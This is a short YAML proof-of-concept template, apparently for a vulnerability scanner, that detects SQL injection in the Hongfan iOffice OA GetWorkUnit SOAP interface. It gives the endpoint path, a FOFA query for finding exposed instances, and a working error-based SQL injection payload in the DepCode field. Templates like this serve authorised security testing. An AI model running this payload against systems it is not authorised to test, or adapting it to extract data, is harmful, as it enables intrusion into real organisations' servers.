id: poc-yaml-hongfan-oa-GetWorkUnit-sqli
info:
  name: 红帆OA GetWorkUnit SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: iOffice
  fofa: app="红帆-ioffice"
variables:
  t1: random_int(1000,9999)
  t2: md5(t1)
requests:
- method: POST
  path: /ioffice/prg/interface/GetWorkUnit.asmx
  headers:
    Content-Type: text/xml;charset=UTF-8
  data: '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="

    http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001

    /XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">

    <soap:Body>

    <GetDutyDetail xmlns="http://tempuri.org/">

    <DepCode>1'' and sys.fn_sqlvarbasetostr(HASHBYTES(''MD5'',''{{.t1}}''))>0;--</DepCode>

    <DutyDate>string</DutyDate>

    <DutyName>string</DutyName>

    </GetDutyDetail>

    </soap:Body>

    </soap:Envelope>'
  expression: 'status_code == 500 &&

    contains(body,"nvarchar") &&

    contains(body,t2)

    '
transport: http
